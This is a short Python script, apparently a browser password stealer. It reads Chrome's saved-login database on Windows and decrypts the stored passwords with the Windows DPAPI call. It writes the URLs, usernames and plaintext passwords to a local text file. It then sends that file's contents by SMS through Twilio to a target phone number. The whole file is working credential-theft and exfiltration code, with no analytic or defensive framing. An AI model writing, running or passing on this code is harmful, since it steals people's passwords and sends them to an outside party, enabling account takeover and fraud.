import os
import sqlite3
import win32crypt
from twilio.rest import Client

# get Twilio account SID and auth token from environment variables
account_sid = os.environ.get('TWILIO_ACCOUNT_SID')
auth_token = os.environ.get('TWILIO_AUTH_TOKEN')
twilio_number = os.environ.get('TWILIO_PHONE_NUMBER')
target_number = os.environ.get('TARGET_PHONE_NUMBER')

# connecting to the database and fetching saved login credentials
data_path = os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\"
login_db = os.path.join(data_path, 'Login Data')

login_info = []
c = sqlite3.connect(login_db)
cursor = c.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
    login_info.append(f"URL: {result[0]}\nUsername: {result[1]}\nPassword: {password}\n\n")
cursor.close()
c.close()

# write login info to a file
with open('chrome-information.txt', 'w') as f:
    f.writelines(login_info)

# read the file contents
with open('chrome-information.txt', 'r') as f:
    message_body = f.read()

# send the message using Twilio API
client = Client(account_sid, auth_token)
message = client.messages.create(
    body=message_body,
    from_=twilio_number,
    to=target_number
)
